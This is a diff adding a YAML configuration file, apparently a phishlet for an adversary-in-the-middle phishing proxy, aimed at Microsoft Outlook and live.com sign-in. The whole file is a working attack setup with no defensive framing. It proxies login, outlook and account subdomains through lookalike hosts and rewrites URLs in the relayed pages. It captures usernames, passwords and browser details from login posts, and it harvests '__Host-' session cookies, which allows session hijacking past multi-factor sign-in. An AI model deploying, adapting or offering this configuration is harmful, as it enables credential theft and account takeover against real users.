@@ -1,0 +1,55 @@
+name: 'outlook'
+author: '@noname'
+min_ver: '2.3.1'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true}
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'account.live.com', orig_sub: 'live', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: 'login.live.com'
+    keys: ['__Host-(.*),regexp']
+# auth_urls:
+  # - '/ppsecure/'
+  # - '/ppsecure/post.srf'
+credentials:
+  username:
+    key: '(login|UserName)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password)'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'useragent'
+      search: '(.*)'
+      type: 'post'
+    - key: 'browser'
+      search: '(.*)'
+      type: 'post'
+    - key: 'engine'
+      search: '(.*)'
+      type: 'post'
+    - key: 'platform'
+      search: '(.*)'
+      type: 'post'
+force_post:
+  - path: '/ppsecure/post.srf'
+    search:
+      - {key: 'PPFT', search: '(.*)'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+login:
+  domain: 'login.live.com'
+  path: '/'
